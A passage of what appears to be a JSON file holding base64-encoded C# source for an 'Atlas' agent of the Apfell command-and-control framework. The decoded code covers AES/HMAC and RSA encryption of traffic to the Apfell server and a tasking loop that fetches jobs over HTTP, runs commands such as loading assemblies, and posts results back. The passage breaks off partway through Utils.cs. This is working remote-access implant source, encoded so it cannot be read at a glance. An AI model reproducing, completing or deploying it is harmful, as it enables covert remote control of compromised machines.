klWKTsNCg0KICAgICAgICAgICAgICAgIHVzaW5nIChNZW1vcnlTdHJlYW0gZW5jcnlwdE1lbVN0cmVhbSA9IG5ldyBNZW1vcnlTdHJlYW0oKSkNCiAgICAgICAgICAgICAgICB1c2luZyAoQ3J5cHRvU3RyZWFtIGVuY3J5cHRDcnlwdG9TdHJlYW0gPSBuZXcgQ3J5cHRvU3RyZWFtKGVuY3J5cHRNZW1TdHJlYW0sIGVuY3J5cHRvciwgQ3J5cHRvU3RyZWFtTW9kZS5Xcml0ZSkpDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICB1c2luZyAoU3RyZWFtV3JpdGVyIGVuY3J5cHRTdHJlYW1Xcml0ZXIgPSBuZXcgU3RyZWFtV3JpdGVyKGVuY3J5cHRDcnlwdG9TdHJlYW0pKQ0KICAgICAgICAgICAgICAgICAgICAgICAgZW5jcnlwdFN0cmVhbVdyaXRlci5Xcml0ZShwbGFpbnRleHQpOw0KICAgICAgICAgICAgICAgICAgICAvLyBXZSBuZWVkIHRvIHNlbmQgdXVpZDppdjpjaXBoZXJ0ZXh0OmhtYWMNCiAgICAgICAgICAgICAgICAgICAgLy8gQ29uY2F0IGl2OmNpcGhlcnRleHQNCiAgICAgICAgICAgICAgICAgICAgYnl0ZVtdIGVuY3J5cHRlZCA9IGFlcy5JVi5Db25jYXQoZW5jcnlwdE1lbVN0cmVhbS5Ub0FycmF5KCkpLlRvQXJyYXkoKTsNCiAgICAgICAgICAgICAgICAgICAgSE1BQ1NIQTI1NiBzaGEyNTYgPSBuZXcgSE1BQ1NIQTI1NihDb252ZXJ0LkZyb21CYXNlNjRTdHJpbmcoQ29uZmlnLlBzaykpOw0KICAgICAgICAgICAgICAgICAgICAvLyBBdHRhY2ggaG1hYyB0byBpdjpjaXBoZXJ0ZXh0DQogICAgICAgICAgICAgICAgICAgIGJ5dGVbXSBobWFjID0gc2hhMjU2LkNvbXB1dGVIYXNoKGVuY3J5cHRlZCk7DQogICAgICAgICAgICAgICAgICAgIC8vIEF0dGFjaCB1dWlkIHRvIGl2OmNpcGhlcnRleHQ6aG1hYw0KI2lmIChERUZBVUxUX0VLRSB8fCBIVFRQX0VLRSkNCiAgICAgICAgICAgICAgICAgICAgYnl0ZVtdIGZpbmFsID0gRW5jb2RpbmcuVVRGOC5HZXRCeXRlcyhDb25maWcudGVtcFVVSUQpLkNvbmNhdChlbmNyeXB0ZWQuQ29uY2F0KGhtYWMpLlRvQXJyYXkoKSkuVG9BcnJheSgpOw0KI2Vsc2UNCiAgICAgICAgICAgICAgICAgICAgYnl0ZVtdIGZpbmFsID0gRW5jb2RpbmcuVVRGOC5HZXRCeXRlcyhDb25maWcuUGF5bG9hZFVVSUQpLkNvbmNhdChlbmNyeXB0ZWQuQ29uY2F0KGhtYWMpLlRvQXJyYXkoKSkuVG9BcnJheSgpOw0KI2VuZGlmDQogICAgICAgICAgICAgICAgICAgIC8vIFJldHVybiBiYXNlNjQgZW5jb2RlZCBjaXBoZXJ0ZXh0DQogICAgICAgICAgICAgICAgICAgIHJldHVybiBDb252ZXJ0LlRvQmFzZTY0U3RyaW5nKGZpbmFsKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KICAgICAgICAvLy8gPHN1bW1hcnk+DQogICAgICAgIC8vLyBFbmNyeXB0IGFueSBnaXZlbiBwbGFpbnRleHQgd2l0aCB0aGUgUFNLIGdpdmVuDQogICAgICAgIC8vLyB0byB0aGUgYWdlbnQuDQogICAgICAgIC8vLyA8L3N1bW1hcnk+DQogICAgICAgIC8vLyA8cGFyYW0gbmFtZT0icGxhaW50ZXh0Ij5QbGFpbnRleHQgdG8gZW5jcnlwdC48L3BhcmFtPg0KICAgICAgICAvLy8gPHJldHVybnM+RW5yeXB0ZWQgc3RyaW5nLjwvcmV0dXJucz4NCiAgICAgICAgcHVibGljIHN0YXRpYyBzdHJpbmcgRW5jcnlwdChzdHJpbmcgcGxhaW50ZXh0KQ0KICAgICAgICB7DQogICAgICAgICAgICB1c2luZyAoQWVzIGFlcyA9IEFlcy5DcmVhdGUoKSkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAvLyBVc2Ugb3VyIFBTSyAoZ2VuZXJhdGVkIGluIEFwZmVsbCBwYXlsb2FkIGNvbmZpZykgYXMgdGhlIEFFUyBrZXkNCiAgICAgICAgICAgICAgICBhZXMuS2V5ID0gQ29udmVydC5Gcm9tQmFzZTY0U3RyaW5nKENvbmZpZy5Qc2spOw0KICAgICAgICAgICAgICAgIGFlcy5QYWRkaW5nID0gUGFkZGluZ01vZGUuUEtDUzc7DQogICAgICAgICAgICAgICAgSUNyeXB0b1RyYW5zZm9ybSBlbmNyeXB0b3IgPSBhZXMuQ3JlYXRlRW5jcnlwdG9yKGFlcy5LZXksIGFlcy5JVik7DQoNCiAgICAgICAgICAgICAgICB1c2luZyAoTWVtb3J5U3RyZWFtIGVuY3J5cHRNZW1TdHJlYW0gPSBuZXcgTWVtb3J5U3RyZWFtKCkpDQogICAgICAgICAgICAgICAgdXNpbmcgKENyeXB0b1N0cmVhbSBlbmNyeXB0Q3J5cHRvU3RyZWFtID0gbmV3IENyeXB0b1N0cmVhbShlbmNyeXB0TWVtU3RyZWFtLCBlbmNyeXB0b3IsIENyeXB0b1N0cmVhbU1vZGUuV3JpdGUpKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgdXNpbmcgKFN0cmVhbVdyaXRlciBlbmNyeXB0U3RyZWFtV3JpdGVyID0gbmV3IFN0cmVhbVdyaXRlcihlbmNyeXB0Q3J5cHRvU3RyZWFtKSkNCiAgICAgICAgICAgICAgICAgICAgICAgIGVuY3J5cHRTdHJlYW1Xcml0ZXIuV3JpdGUocGxhaW50ZXh0KTsNCiAgICAgICAgICAgICAgICAgICAgLy8gV2UgbmVlZCB0byBzZW5kIHV1aWQ6aXY6Y2lwaGVydGV4dDpobWFjDQogICAgICAgICAgICAgICAgICAgIC8vIENvbmNhdCBpdjpjaXBoZXJ0ZXh0DQogICAgICAgICAgICAgICAgICAgIGJ5dGVbXSBlbmNyeXB0ZWQgPSBhZXMuSVYuQ29uY2F0KGVuY3J5cHRNZW1TdHJlYW0uVG9BcnJheSgpKS5Ub0FycmF5KCk7DQogICAgICAgICAgICAgICAgICAgIEhNQUNTSEEyNTYgc2hhMjU2ID0gbmV3IEhNQUNTSEEyNTYoQ29udmVydC5Gcm9tQmFzZTY0U3RyaW5nKENvbmZpZy5Qc2spKTsNCiAgICAgICAgICAgICAgICAgICAgLy8gQXR0YWNoIGhtYWMgdG8gaXY6Y2lwaGVydGV4dA0KICAgICAgICAgICAgICAgICAgICBieXRlW10gaG1hYyA9IHNoYTI1Ni5Db21wdXRlSGFzaChlbmNyeXB0ZWQpOw0KICAgICAgICAgICAgICAgICAgICAvLyBBdHRhY2ggdXVpZCB0byBpdjpjaXBoZXJ0ZXh0OmhtYWMNCiAgICAgICAgICAgICAgICAgICAgYnl0ZVtdIGZpbmFsID0gRW5jb2RpbmcuVVRGOC5HZXRCeXRlcyhDb25maWcuVVVJRCkuQ29uY2F0KGVuY3J5cHRlZC5Db25jYXQoaG1hYykuVG9BcnJheSgpKS5Ub0FycmF5KCk7DQogICAgICAgICAgICAgICAgICAgIC8vIFJldHVybiBiYXNlNjQgZW5jb2RlZCBjaXBoZXJ0ZXh0DQogICAgICAgICAgICAgICAgICAgIHJldHVybiBDb252ZXJ0LlRvQmFzZTY0U3RyaW5nKGZpbmFsKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KICAgICAgICAvLy8gPHN1bW1hcnk+DQogICAgICAgIC8vLyBEZWNyeXB0IGEgc3RyaW5nIHdoaWNoIGhhcyBiZWVuIGVuY3J5cHRlZCB3aXRoIHRoZSBQU0suDQogICAgICAgIC8vLyA8L3N1bW1hcnk+DQogICAgICAgIC8vLyA8cGFyYW0gbmFtZT0iZW5jcnlwdGVkIj5UaGUgZW5jcnlwdGVkIHN0cmluZy48L3BhcmFtPg0KICAgICAgICAvLy8gPHJldHVybnM+PC9yZXR1cm5zPg0KICAgICAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBEZWNyeXB0KHN0cmluZyBlbmNyeXB0ZWQpDQogICAgICAgIHsNCiAgICAgICAgICAgIGJ5dGVbXSBpbnB1dCA9IENvbnZlcnQuRnJvbUJhc2U2NFN0cmluZyhlbmNyeXB0ZWQpOw0KDQogICAgICAgICAgICBpbnQgdXVpZExlbmd0aCA9IENvbmZpZy5QYXlsb2FkVVVJRC5MZW5ndGg7DQogICAgICAgICAgICAvLyBJbnB1dCBpcyB1dWlkOml2OmNpcGhlcnRleHQ6aG1hYywgSVYgaXMgMTYgYnl0ZXMNCiAgICAgICAgICAgIGJ5dGVbXSB1dWlkSW5wdXQgPSBuZXcgYnl0ZVt1dWlkTGVuZ3RoXTsNCiAgICAgICAgICAgIEFycmF5LkNvcHkoaW5wdXQsIHV1aWRJbnB1dCwgdXVpZExlbmd0aCk7DQoNCiAgICAgICAgICAgIGJ5dGVbXSBJViA9IG5ldyBieXRlWzE2XTsNCiAgICAgICAgICAgIEFycmF5LkNvcHkoaW5wdXQsIHV1aWRMZW5ndGgsIElWLCAwLCAxNik7DQoNCiAgICAgICAgICAgIGJ5dGVbXSBjaXBoZXJ0ZXh0ID0gbmV3IGJ5dGVbaW5wdXQuTGVuZ3RoIC0gdXVpZExlbmd0aCAtIDE2IC0gMzJdOw0KICAgICAgICAgICAgQXJyYXkuQ29weShpbnB1dCwgdXVpZExlbmd0aCArIDE2LCBjaXBoZXJ0ZXh0LCAwLCBjaXBoZXJ0ZXh0Lkxlbmd0aCk7DQoNCiAgICAgICAgICAgIEhNQUNTSEEyNTYgc2hhMjU2ID0gbmV3IEhNQUNTSEEyNTYoQ29udmVydC5Gcm9tQmFzZTY0U3RyaW5nKENvbmZpZy5Qc2spKTsNCiAgICAgICAgICAgIGJ5dGVbXSBobWFjID0gbmV3IGJ5dGVbMzJdOw0KICAgICAgICAgICAgQXJyYXkuQ29weShpbnB1dCwgdXVpZExlbmd0aCArIDE2ICsgY2lwaGVydGV4dC5MZW5ndGgsIGhtYWMsIDAsIDMyKTsNCg0KICAgICAgICAgICAgaWYgKENvbnZlcnQuVG9CYXNlNjRTdHJpbmcoaG1hYykgPT0gQ29udmVydC5Ub0Jhc2U2NFN0cmluZyhzaGEyNTYuQ29tcHV0ZUhhc2goSVYuQ29uY2F0KGNpcGhlcnRleHQpLlRvQXJyYXkoKSkpKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHVzaW5nIChBZXMgYWVzID0gQWVzLkNyZWF0ZSgpKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgLy8gVXNlIG91ciBQU0sgKGdlbmVyYXRlZCBpbiBBcGZlbGwgcGF5bG9hZCBjb25maWcpIGFzIHRoZSBBRVMga2V5DQogICAgICAgICAgICAgICAgICAgIGFlcy5LZXkgPSBDb252ZXJ0LkZyb21CYXNlNjRTdHJpbmcoQ29uZmlnLlBzayk7DQogICAgICAgICAgICAgICAgICAgIGFlcy5QYWRkaW5nID0gUGFkZGluZ01vZGUuUEtDUzc7DQogICAgICAgICAgICAgICAgICAgIElDcnlwdG9UcmFuc2Zvcm0gZGVjcnlwdG9yID0gYWVzLkNyZWF0ZURlY3J5cHRvcihhZXMuS2V5LCBJVik7DQoNCiAgICAgICAgICAgICAgICAgICAgdXNpbmcgKE1lbW9yeVN0cmVhbSBkZWNyeXB0TWVtU3RyZWFtID0gbmV3IE1lbW9yeVN0cmVhbShjaXBoZXJ0ZXh0KSkNCiAgICAgICAgICAgICAgICAgICAgdXNpbmcgKENyeXB0b1N0cmVhbSBkZWNyeXB0Q3J5cHRvU3RyZWFtID0gbmV3IENyeXB0b1N0cmVhbShkZWNyeXB0TWVtU3RyZWFtLCBkZWNyeXB0b3IsIENyeXB0b1N0cmVhbU1vZGUuUmVhZCkpDQogICAgICAgICAgICAgICAgICAgIHVzaW5nIChTdHJlYW1SZWFkZXIgZGVjcnlwdFN0cmVhbVJlYWRlciA9IG5ldyBTdHJlYW1SZWFkZXIoZGVjcnlwdENyeXB0b1N0cmVhbSkpDQogICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIHN0cmluZyBkZWNyeXB0ZWQgPSBkZWNyeXB0U3RyZWFtUmVhZGVyLlJlYWRUb0VuZCgpOw0KICAgICAgICAgICAgICAgICAgICAgICAgLy8gUmV0dXJuIGRlY3J5cHRlZCBtZXNzYWdlIGZyb20gQXBmZWxsIHNlcnZlcg0KICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIEVuY29kaW5nLlVURjguR2V0U3RyaW5nKHV1aWRJbnB1dCkgKyBkZWNyeXB0ZWQ7DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQogICAgICAgICAgICBlbHNlDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgcmV0dXJuICIiOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQojZW5kaWYNCiNpZiAoREVGQVVMVF9FS0UgfHwgSFRUUF9FS0UpDQogICAgICAgIHB1YmxpYyBzdGF0aWMgdm9pZCBHZW5Sc2FLZXlzKCkNCiAgICAgICAgew0KDQogICAgICAgICAgICBDb25maWcuUnNhID0gbmV3IFJTQUNyeXB0b1NlcnZpY2VQcm92aWRlcig0MDk2KSANCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBQZXJzaXN0S2V5SW5Dc3AgPSBmYWxzZQ0KICAgICAgICAgICAgfTsNCiAgICAgICAgfQ0KDQogICAgICAgIHB1YmxpYyBzdGF0aWMgYnl0ZVtdIFJzYURlY3J5cHQoYnl0ZVtdIERhdGEpDQogICAgICAgIHsNCiAgICAgICAgICAgIENvbmZpZy5Sc2EuSW1wb3J0UGFyYW1ldGVycyhDb25maWcuUnNhLkV4cG9ydFBhcmFtZXRlcnModHJ1ZSkpOw0KICAgICAgICAgICAgYnl0ZVtdIGZpbmFsID0gQ29uZmlnLlJzYS5EZWNyeXB0KERhdGEsIHRydWUpOw0KICAgICAgICAgICAgcmV0dXJuIGZpbmFsOw0KICAgICAgICB9DQoNCiAgICAgICAgcHVibGljIHN0YXRpYyBzdHJpbmcgR2V0UHViS2V5KCkNCiAgICAgICAgew0KICAgICAgICAgICAgU3RyaW5nV3JpdGVyIG91dFN0cmVhbSA9IG5ldyBTdHJpbmdXcml0ZXIoKTsNCiAgICAgICAgICAgIEV4cG9ydFB1YmxpY0tleShDb25maWcuUnNhLCBvdXRTdHJlYW0pOw0KICAgICAgICAgICAgcmV0dXJuIENvbnZlcnQuVG9CYXNlNjRTdHJpbmcoRW5jb2RpbmcuVVRGOC5HZXRCeXRlcyhvdXRTdHJlYW0uVG9TdHJpbmcoKSkpOw0KICAgICAgICB9DQoNCiAgICAgICAgLy8gaHR0cHM6Ly9zdGFja292ZXJmbG93LmNvbS9xdWVzdGlvbnMvMjg0MDY4ODgvYy1zaGFycC1yc2EtcHVibGljLWtleS1vdXRwdXQtbm90LWNvcnJlY3QvMjg0MDc2OTMjMjg0MDc2OTMNCiAgICAgICAgcHJpdmF0ZSBzdGF0aWMgdm9pZCBFeHBvcnRQdWJsaWNLZXkoUlNBQ3J5cHRvU2VydmljZVByb3ZpZGVyIGNzcCwgVGV4dFdyaXRlciBvdXRwdXRTdHJlYW0pDQogICAgICAgIHsNCiAgICAgICAgICAgIHZhciBwYXJhbWV0ZXJzID0gY3NwLkV4cG9ydFBhcmFtZXRlcnMoZmFsc2UpOw0KICAgICAgICAgICAgdXNpbmcgKHZhciBzdHJlYW0gPSBuZXcgTWVtb3J5U3RyZWFtKCkpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgdmFyIHdyaXRlciA9IG5ldyBCaW5hcnlXcml0ZXIoc3RyZWFtKTsNCiAgICAgICAgICAgICAgICB3cml0ZXIuV3JpdGUoKGJ5dGUpMHgzMCk7IC8vIFNFUVVFTkNFDQogICAgICAgICAgICAgICAgdXNpbmcgKHZhciBpbm5lclN0cmVhbSA9IG5ldyBNZW1vcnlTdHJlYW0oKSkNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIHZhciBpbm5lcldyaXRlciA9IG5ldyBCaW5hcnlXcml0ZXIoaW5uZXJTdHJlYW0pOw0KICAgICAgICAgICAgICAgICAgICBpbm5lcldyaXRlci5Xcml0ZSgoYnl0ZSkweDMwKTsgLy8gU0VRVUVOQ0UNCiAgICAgICAgICAgICAgICAgICAgRW5jb2RlTGVuZ3RoKGlubmVyV3JpdGVyLCAxMyk7DQogICAgICAgICAgICAgICAgICAgIGlubmVyV3JpdGVyLldyaXRlKChieXRlKTB4MDYpOyAvLyBPQkpFQ1QgSURFTlRJRklFUg0KICAgICAgICAgICAgICAgICAgICB2YXIgcnNhRW5jcnlwdGlvbk9pZCA9IG5ldyBieXRlW10geyAweDJhLCAweDg2LCAweDQ4LCAweDg2LCAweGY3LCAweDBkLCAweDAxLCAweDAxLCAweDAxIH07DQogICAgICAgICAgICAgICAgICAgIEVuY29kZUxlbmd0aChpbm5lcldyaXRlciwgcnNhRW5jcnlwdGlvbk9pZC5MZW5ndGgpOw0KICAgICAgICAgICAgICAgICAgICBpbm5lcldyaXRlci5Xcml0ZShyc2FFbmNyeXB0aW9uT2lkKTsNCiAgICAgICAgICAgICAgICAgICAgaW5uZXJXcml0ZXIuV3JpdGUoKGJ5dGUpMHgwNSk7IC8vIE5VTEwNCiAgICAgICAgICAgICAgICAgICAgRW5jb2RlTGVuZ3RoKGlubmVyV3JpdGVyLCAwKTsNCiAgICAgICAgICAgICAgICAgICAgaW5uZXJXcml0ZXIuV3JpdGUoKGJ5dGUpMHgwMyk7IC8vIEJJVCBTVFJJTkcNCiAgICAgICAgICAgICAgICAgICAgdXNpbmcgKHZhciBiaXRTdHJpbmdTdHJlYW0gPSBuZXcgTWVtb3J5U3RyZWFtKCkpDQogICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIHZhciBiaXRTdHJpbmdXcml0ZXIgPSBuZXcgQmluYXJ5V3JpdGVyKGJpdFN0cmluZ1N0cmVhbSk7DQogICAgICAgICAgICAgICAgICAgICAgICBiaXRTdHJpbmdXcml0ZXIuV3JpdGUoKGJ5dGUpMHgwMCk7IC8vICMgb2YgdW51c2VkIGJpdHMNCiAgICAgICAgICAgICAgICAgICAgICAgIGJpdFN0cmluZ1dyaXRlci5Xcml0ZSgoYnl0ZSkweDMwKTsgLy8gU0VRVUVOQ0UNCiAgICAgICAgICAgICAgICAgICAgICAgIHVzaW5nICh2YXIgcGFyYW1zU3RyZWFtID0gbmV3IE1lbW9yeVN0cmVhbSgpKQ0KICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHZhciBwYXJhbXNXcml0ZXIgPSBuZXcgQmluYXJ5V3JpdGVyKHBhcmFtc1N0cmVhbSk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgRW5jb2RlSW50ZWdlckJpZ0VuZGlhbihwYXJhbXNXcml0ZXIsIHBhcmFtZXRlcnMuTW9kdWx1cyk7IC8vIE1vZHVsdXMNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBFbmNvZGVJbnRlZ2VyQmlnRW5kaWFuKHBhcmFtc1dyaXRlciwgcGFyYW1ldGVycy5FeHBvbmVudCk7IC8vIEV4cG9uZW50DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgdmFyIHBhcmFtc0xlbmd0aCA9IChpbnQpcGFyYW1zU3RyZWFtLkxlbmd0aDsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBFbmNvZGVMZW5ndGgoYml0U3RyaW5nV3JpdGVyLCBwYXJhbXNMZW5ndGgpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJpdFN0cmluZ1dyaXRlci5Xcml0ZShwYXJhbXNTdHJlYW0uR2V0QnVmZmVyKCksIDAsIHBhcmFtc0xlbmd0aCk7DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICB2YXIgYml0U3RyaW5nTGVuZ3RoID0gKGludCliaXRTdHJpbmdTdHJlYW0uTGVuZ3RoOw0KICAgICAgICAgICAgICAgICAgICAgICAgRW5jb2RlTGVuZ3RoKGlubmVyV3JpdGVyLCBiaXRTdHJpbmdMZW5ndGgpOw0KICAgICAgICAgICAgICAgICAgICAgICAgaW5uZXJXcml0ZXIuV3JpdGUoYml0U3RyaW5nU3RyZWFtLkdldEJ1ZmZlcigpLCAwLCBiaXRTdHJpbmdMZW5ndGgpOw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIHZhciBsZW5ndGggPSAoaW50KWlubmVyU3RyZWFtLkxlbmd0aDsNCiAgICAgICAgICAgICAgICAgICAgRW5jb2RlTGVuZ3RoKHdyaXRlciwgbGVuZ3RoKTsNCiAgICAgICAgICAgICAgICAgICAgd3JpdGVyLldyaXRlKGlubmVyU3RyZWFtLkdldEJ1ZmZlcigpLCAwLCBsZW5ndGgpOw0KICAgICAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgICAgIHZhciBiYXNlNjQgPSBDb252ZXJ0LlRvQmFzZTY0U3RyaW5nKHN0cmVhbS5HZXRCdWZmZXIoKSwgMCwgKGludClzdHJlYW0uTGVuZ3RoKS5Ub0NoYXJBcnJheSgpOw0KICAgICAgICAgICAgICAgIG91dHB1dFN0cmVhbS5Xcml0ZUxpbmUoIi0tLS0tQkVHSU4gUFVCTElDIEtFWS0tLS0tIik7DQogICAgICAgICAgICAgICAgZm9yICh2YXIgaSA9IDA7IGkgPCBiYXNlNjQuTGVuZ3RoOyBpICs9IDY0KQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgb3V0cHV0U3RyZWFtLldyaXRlTGluZShiYXNlNjQsIGksIE1hdGguTWluKDY0LCBiYXNlNjQuTGVuZ3RoIC0gaSkpOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBvdXRwdXRTdHJlYW0uV3JpdGVMaW5lKCItLS0tLUVORCBQVUJMSUMgS0VZLS0tLS0iKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KDQogICAgICAgIHByaXZhdGUgc3RhdGljIHZvaWQgRW5jb2RlTGVuZ3RoKEJpbmFyeVdyaXRlciBzdHJlYW0sIGludCBsZW5ndGgpDQogICAgICAgIHsNCiAgICAgICAgICAgIGlmIChsZW5ndGggPCAwKSB0aHJvdyBuZXcgQXJndW1lbnRPdXRPZlJhbmdlRXhjZXB0aW9uKCJsZW5ndGgiLCAiTGVuZ3RoIG11c3QgYmUgbm9uLW5lZ2F0aXZlIik7DQogICAgICAgICAgICBpZiAobGVuZ3RoIDwgMHg4MCkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAvLyBTaG9ydCBmb3JtDQogICAgICAgICAgICAgICAgc3RyZWFtLldyaXRlKChieXRlKWxlbmd0aCk7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBlbHNlDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgLy8gTG9uZyBmb3JtDQogICAgICAgICAgICAgICAgdmFyIHRlbXAgPSBsZW5ndGg7DQogICAgICAgICAgICAgICAgdmFyIGJ5dGVzUmVxdWlyZWQgPSAwOw0KICAgICAgICAgICAgICAgIHdoaWxlICh0ZW1wID4gMCkNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIHRlbXAgPj49IDg7DQogICAgICAgICAgICAgICAgICAgIGJ5dGVzUmVxdWlyZWQrKzsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgc3RyZWFtLldyaXRlKChieXRlKShieXRlc1JlcXVpcmVkIHwgMHg4MCkpOw0KICAgICAgICAgICAgICAgIGZvciAodmFyIGkgPSBieXRlc1JlcXVpcmVkIC0gMTsgaSA+PSAwOyBpLS0pDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBzdHJlYW0uV3JpdGUoKGJ5dGUpKGxlbmd0aCA+PiAoOCAqIGkpICYgMHhmZikpOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KDQogICAgICAgIHByaXZhdGUgc3RhdGljIHZvaWQgRW5jb2RlSW50ZWdlckJpZ0VuZGlhbihCaW5hcnlXcml0ZXIgc3RyZWFtLCBieXRlW10gdmFsdWUsIGJvb2wgZm9yY2VVbnNpZ25lZCA9IHRydWUpDQogICAgICAgIHsNCiAgICAgICAgICAgIHN0cmVhbS5Xcml0ZSgoYnl0ZSkweDAyKTsgLy8gSU5URUdFUg0KICAgICAgICAgICAgdmFyIHByZWZpeFplcm9zID0gMDsNCiAgICAgICAgICAgIGZvciAodmFyIGkgPSAwOyBpIDwgdmFsdWUuTGVuZ3RoOyBpKyspDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgaWYgKHZhbHVlW2ldICE9IDApIGJyZWFrOw0KICAgICAgICAgICAgICAgIHByZWZpeFplcm9zKys7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBpZiAodmFsdWUuTGVuZ3RoIC0gcHJlZml4WmVyb3MgPT0gMCkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBFbmNvZGVMZW5ndGgoc3RyZWFtLCAxKTsNCiAgICAgICAgICAgICAgICBzdHJlYW0uV3JpdGUoKGJ5dGUpMCk7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBlbHNlDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgaWYgKGZvcmNlVW5zaWduZWQgJiYgdmFsdWVbcHJlZml4WmVyb3NdID4gMHg3ZikNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIC8vIEFkZCBhIHByZWZpeCB6ZXJvIHRvIGZvcmNlIHVuc2lnbmVkIGlmIHRoZSBNU0IgaXMgMQ0KICAgICAgICAgICAgICAgICAgICBFbmNvZGVMZW5ndGgoc3RyZWFtLCB2YWx1ZS5MZW5ndGggLSBwcmVmaXhaZXJvcyArIDEpOw0KICAgICAgICAgICAgICAgICAgICBzdHJlYW0uV3JpdGUoKGJ5dGUpMCk7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIEVuY29kZUxlbmd0aChzdHJlYW0sIHZhbHVlLkxlbmd0aCAtIHByZWZpeFplcm9zKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgZm9yICh2YXIgaSA9IHByZWZpeFplcm9zOyBpIDwgdmFsdWUuTGVuZ3RoOyBpKyspDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBzdHJlYW0uV3JpdGUodmFsdWVbaV0pOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KI2VuZGlmDQogICAgfQ0KfQ0K"
        },
        {
          "Utils.cs": "dXNpbmcgU3lzdGVtOw0KdXNpbmcgU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWM7DQp1c2luZyBTeXN0ZW0uVGhyZWFkaW5nOw0KdXNpbmcgU3lzdGVtLk5ldDsNCnVzaW5nIFN5c3RlbS5UZXh0LlJlZ3VsYXJFeHByZXNzaW9uczsNCnVzaW5nIFN5c3RlbS5UZXh0Ow0KdXNpbmcgU3lzdGVtLkxpbnE7DQp1c2luZyBTeXN0ZW0uSU87DQoNCm5hbWVzcGFjZSBBdGxhcw0Kew0KICAgIHB1YmxpYyBjbGFzcyBVdGlscw0KICAgIHsNCiAgICAgICAgcHVibGljIHN0YXRpYyB2b2lkIExvb3AoSm9iTGlzdCBKb2JMaXN0KQ0KICAgICAgICB7DQogICAgICAgICAgICBpZiAoIUNoZWNrRGF0ZSgpKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIEVudmlyb25tZW50LkV4aXQoMSk7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBIdHRwLkdldFRhc2tpbmcoSm9iTGlzdCk7DQogICAgICAgICAgICBEaXNwYXRjaChKb2JMaXN0KTsNCiAgICAgICAgICAgIEh0dHAuUG9zdFJlc3BvbnNlKEpvYkxpc3QpOw0KICAgICAgICB9DQoNCiAgICAgICAgcHVibGljIHN0YXRpYyBib29sIERpc3BhdGNoIChKb2JMaXN0IEpvYkxpc3QpDQogICAgICAgIHsNCiAgICAgICAgICAgIHRyeQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIGZvcmVhY2ggKEpvYiBKb2IgaW4gSm9iTGlzdC5qb2JzKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgaWYgKCFKb2Iuam9iX3N0YXJ0ZWQpDQogICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChKb2IuY29tbWFuZCA9PSAibG9hZGFzc2VtYmx5IikNCiAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoSm9iLmNodW5rX251bSA9PSBKb2IudG90YWxfY2h1bmtzKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgVGhyZWFk